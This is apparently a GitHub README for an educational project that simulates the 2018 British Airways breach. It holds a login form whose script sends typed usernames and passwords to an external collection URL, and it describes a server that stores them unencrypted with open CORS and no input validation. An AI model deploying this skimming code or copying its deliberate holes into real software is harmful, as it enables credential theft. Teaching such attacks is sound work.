# XSS Attack Project

## Disclaimer
This project is intended for educational purposes only. Cross-Site Scripting (XSS) is a security vulnerability that should only be tested responsibly and with proper authorization. Unauthorized testing of XSS vulnerabilities is illegal and unethical.

## Project Description
This project demonstrates a Cross-Site Scripting (XSS) attack using a simple login form. The server collects login data and saves it to a JSON file.

## Table of Contents

1. [Installation](#installation)
2. [How to run the code](#how-to-run-the-code)
3. [Client Side Code](#client-side-code)
4. [XSS Demo Video](#xss-demo-video)
5. [British Airways Data Breach Simulation](#british-airways-data-breach-simulation)
6. [Contribution Guidelines](#contribution-guidelines)
7. [License Information](#license-information)
8. [Additional Resources](#additional-resources)

## Installation

* Ensure you have Node.js installed on your machine. You can download it from [Node.js](https://nodejs.org/).
* Ensure you have Git installed on your machine. You can download it from [Git](https://git-scm.com/).
* Clone the repository to your local machine.
* Navigate to the project directory.
* Install the dependencies by running the following command:
  ```bash
  npm install
  ```

## How to run the code

* It is recommended to run this project in a local or isolated environment due to potentially sensitive login data. But you can run on GitHub Codespace as well.
* Start the server by running the following command:
  ```bash
  node server.js
  ```

## Client Side Code

```html
<form id="loginForm">
<label for="username">Username:</label>
<input type="text" id="username" name="username" required><br><br>
 
<label for="password">Password:</label>
<input type="password" id="password" name="password" required><br><br>
 
<button type="button" id="loginButton">Login</button>
</form>
 
<script>
const apiUrl = 'https://unearthly-hex-679pp459qqgh574r-8001.app.github.dev/collect';

        function sendLoginToAPI(event) {
            event.preventDefault();

            alert("Login button clicked!");

            const username = $('#username').val();
            const password = $('#password').val();

            if (!username || !password) {
                alert("Both username and password are required.");
                return;
            }

            $.ajax({
                url: apiUrl,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ username: username, password: password }),
                success: function(data) {
                    console.log('Login response:', data);
                    alert('Login successful!');
                },
                error: function(xhr, status, error) {
                    console.error('Login failed:', error);
                    alert('Invalid username or password.');
                }
            });
        }

        $('#loginButton').on('mousedown', sendLoginToAPI);
</script>
```

Change your workspace name to your own workspace name in the apiUrl variable.

### Explanation
The client-side code handles the user input from the login form. When the login button is clicked, the `sendLoginToAPI` function is triggered. This function collects the username and password entered by the user and sends them to the server using an AJAX POST request. The server then processes this data and saves it to a JSON file. The XSS vulnerability could be exploited if an attacker injects malicious scripts into the username or password fields, which would then be executed when the data is processed or displayed.

## XSS Demo Video
<details><summary>View Demo Video</summary>


https://github.com/user-attachments/assets/289917ae-d0b3-43f3-8b9d-1af6f298c824

</details>

## British Airways Data Breach Simulation

### Back Story
In 2018, British Airways experienced a significant data breach that affected approximately 400,000 customers. The breach was a result of attackers exploiting vulnerabilities in the British Airways website, allowing them to steal sensitive customer information, including personal and financial data. The incident highlighted the importance of robust security measures to protect user data and prevent unauthorized access.

### Simulation Details
This project simulates the British Airways data breach by demonstrating several key vulnerabilities that were present in the actual incident. Here are the specific ways in which this project mirrors the British Airways data breach:

* **Cross-Site Scripting (XSS)**: The project demonstrates how an attacker can inject malicious scripts into the username or password fields of a login form. This is similar to how attackers exploited vulnerabilities in the British Airways website to steal customer data. The client-side code in `client_code.html` and the server-side code in `server.js` illustrate this vulnerability.

* **Insecure Data Storage**: The project saves login data, including usernames and passwords, to a JSON file (`users.json`) without any encryption or hashing. This mirrors the lack of proper data protection measures that contributed to the British Airways data breach.

* **Lack of Input Validation**: The server-side code in `server.js` performs only basic validation for the presence of username and password fields. It does not sanitize or validate the input to prevent malicious data from being processed, similar to the insufficient input validation that allowed attackers to exploit the British Airways website.

* **CORS Misconfiguration**: The server in `server.js` enables CORS (Cross-Origin Resource Sharing) without any restrictions, which can allow unauthorized domains to interact with the server and potentially exploit vulnerabilities. This is akin to the misconfigurations that can lead to data breaches like the one experienced by British Airways.

These vulnerabilities highlight the importance of implementing proper security measures, such as input validation, data encryption, and secure CORS configurations, to protect against attacks and ensure the safety of user data.

### Relevant Links
For more information about the British Airways data breach, you can refer to the following links:

* [British Airways data breach: What happened, how it affected customers, and what to do next](https://www.techradar.com/news/british-airways-data-breach-what-happened-how-it-affected-customers-and-what-to-do-next)
* [British Airways fined £20m for data breach affecting 400,000 customers](https://www.theguardian.com/business/2020/oct/16/british-airways-fined-20m-for-data-breach-affecting-400000-customers)
* [British Airways data breach: What you need to know](https://www.csoonline.com/article/3444488/british-airways-data-breach-what-you-need-to-know.html)
* [British Airways data breach: What happened and what to do](https://www.itpro.co.uk/security/32117/british-airways-data-breach-what-happened-and-what-to-do)

## Contribution Guidelines

1. Fork the repository.
2. Create a new branch for your feature or bugfix.
3. Commit your changes with a descriptive message.
4. Push your changes to your forked repository.
5. Create a pull request to the main repository.

## License Information

This project is licensed under the Apache License, Version 2.0.

## Additional Resources

* [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [MDN Web Docs: Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
